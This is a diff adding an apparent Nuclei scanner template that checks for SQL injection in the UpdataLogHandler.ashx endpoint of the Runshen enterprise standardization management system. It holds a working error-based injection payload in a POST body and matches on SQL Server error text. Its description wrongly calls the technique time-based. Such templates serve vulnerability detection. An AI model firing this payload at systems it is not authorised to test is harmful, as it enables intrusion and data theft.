@@ -1,0 +1,39 @@
+id: poc-yaml-run-shen-updataloghandler-sqli
+info:
+  name: 润申企业标准化管理系统 UpdataLogHandler SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    description: |
+      This template detects a SQL injection vulnerability in 润申企业标准化管理系统's UpdataLogHandler. It leverages a time-based SQL injection to verify the vulnerability by hashing a random number and checking its presence in the response.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/PDCA/ashx/UpdataLogHandler.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=GetAll&start='and (select sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))>0--&end=&code=11&type=2&page=1&rows=20
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+      - type: word
+        part: body
+        words:
+          - "转换成数据类型 int 时失败"
